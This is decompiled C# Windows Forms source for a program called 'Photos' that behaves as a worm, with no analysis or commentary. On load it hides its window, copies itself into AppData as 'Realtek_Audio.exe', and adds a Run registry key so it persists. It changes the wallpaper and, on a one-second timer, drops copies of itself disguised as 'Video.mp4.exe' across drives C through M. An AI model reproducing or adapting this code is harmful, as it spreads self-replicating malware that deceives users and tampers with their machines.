using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Photos.My.Resources;

namespace Photos;

[DesignerGenerated]
public class Form1 : Form
{
	private string DirSys;

	private IContainer components;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		DirSys = "";
		InitializeComponent();
	}

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		DirSys = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		try
		{
			File.Copy(Application.get_ExecutablePath(), DirSys + "\\Realtek_Audio.exe");
			FileSystem.SetAttr(DirSys + "\\Realtek_Audio.exe", (FileAttribute)2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(Application.get_ProductName(), DirSys + "\\Realtek_Audio.exe");
			_ = null;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			((Image)Resources.Wallpaper).Save(DirSys + "\\1.bmp", ImageFormat.get_Bmp());
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.SetAttr(DirSys + "\\1.bmp", (FileAttribute)2);
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			new Wallpaper().SetWallpaper(DirSys + "\\1.bmp", Wallpaper.Style.Centered);
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "c:\\" + Environment.MachineName + ".mp4.exe");
			FileSystem.SetAttr("c:\\" + Environment.MachineName + ".mp4.exe", (FileAttribute)2);
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "d:\\" + Environment.MachineName + ".mp4.exe");
			FileSystem.SetAttr("d:\\" + Environment.MachineName + ".mp4.exe", (FileAttribute)2);
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "e:\\" + Environment.MachineName + ".mp4.exe");
			FileSystem.SetAttr("e:\\" + Environment.MachineName + ".mp4.exe", (FileAttribute)2);
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		Timer1.set_Enabled(true);
	}

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	private void Timer1_Tick(object sender, EventArgs e)
	{
		DirSys = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		try
		{
			new Wallpaper().SetWallpaper(DirSys + "\\1.bmp", Wallpaper.Style.Centered);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "C:/Video.mp4.exe");
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "D:/Video.mp4.exe");
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "E:/Video.mp4.exe");
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "F:/Video.mp4.exe");
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "G:/Video.mp4.exe");
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "H:/Video.mp4.exe");
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "I:/Video.mp4.exe");
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "J:/Video.mp4.exe");
		}
		catch (Exception ex17)
		{
			ProjectData.SetProjectError(ex17);
			Exception ex18 = ex17;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "K:/Video.mp4.exe");
		}
		catch (Exception ex19)
		{
			ProjectData.SetProjectError(ex19);
			Exception ex20 = ex19;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "L:/Video.mp4.exe");
		}
		catch (Exception ex21)
		{
			ProjectData.SetProjectError(ex21);
			Exception ex22 = ex21;
			ProjectData.ClearProjectError();
		}
		try
		{
			FileSystem.FileCopy(Application.get_StartupPath() + "\\Photos.exe", "M:/Video.mp4.exe");
		}
		catch (Exception ex23)
		{
			ProjectData.SetProjectError(ex23);
			Exception ex24 = ex23;
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
